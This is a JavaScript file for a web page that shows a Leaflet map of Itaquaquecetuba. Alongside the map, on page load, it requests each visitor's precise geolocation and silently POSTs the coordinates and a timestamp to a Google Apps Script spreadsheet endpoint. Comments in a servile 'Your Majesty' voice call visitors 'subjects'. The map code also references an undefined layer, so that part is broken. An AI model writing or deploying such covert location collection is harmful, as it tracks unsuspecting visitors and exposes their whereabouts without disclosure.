$(document).ready(function () {

    // MAPA
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

  // O MAPA QUE NUNCA FALHA — BASE SÓLIDA
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    maxZoom: 19,
    className: 'mapa-real-preto' // A etiqueta de Vossa Majestade
}).addTo(map);

   
    

    // AJUSTA ZOOM AO TERRITÓRIO REAL
    map.fitBounds(itaquaLayer.getBounds());

    // MARCADOR CENTRAL
    L.marker([-23.4866, -46.3487])
        .addTo(map)
        .bindPopup('Itaquaquecetuba — Território Soberano');

});

navigator.geolocation.getCurrentPosition(pos => {
  const dados = {
    lat: pos.coords.latitude,
    long: pos.coords.longitude,
    timestamp: new Date().toISOString() // Adicionei a hora para vossa conveniência real
  };

  // Enviando o mensageiro com as coordenadas ao vosso castelo (Google Sheets)
  fetch('https://script.google.com/macros/s/AKfycbwxiNFyhwQh_B0e2efWkC6k8hWiJuzpJOPrcu2bv1qbXEVmGc6cakSPbIY90_0sR1EnAA/exec', {
    method: 'POST',
    mode: 'no-cors', // Essencial para que o navegador não questione vossa autoridade
    cache: 'no-cache',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(dados)
  })
  .then(() => {
    console.log("✅ Glória! Coordenadas enviadas com sucesso para a planilha de Vossa Majestade!");
  })
  .catch(erro => {
    console.error("❌ Alerta! Ocorreu uma insurreição no envio:", erro);
  });

}, err => {
  // Caso o súdito ouse negar o acesso à localização
  console.warn("⚠️ O súdito recusou-se a compartilhar a localização com o Trono.", err.message);
}, {
  enableHighAccuracy: true, // Para que a precisão seja digna de um mapa imperial
  timeout: 10000,
  maximumAge: 0
});
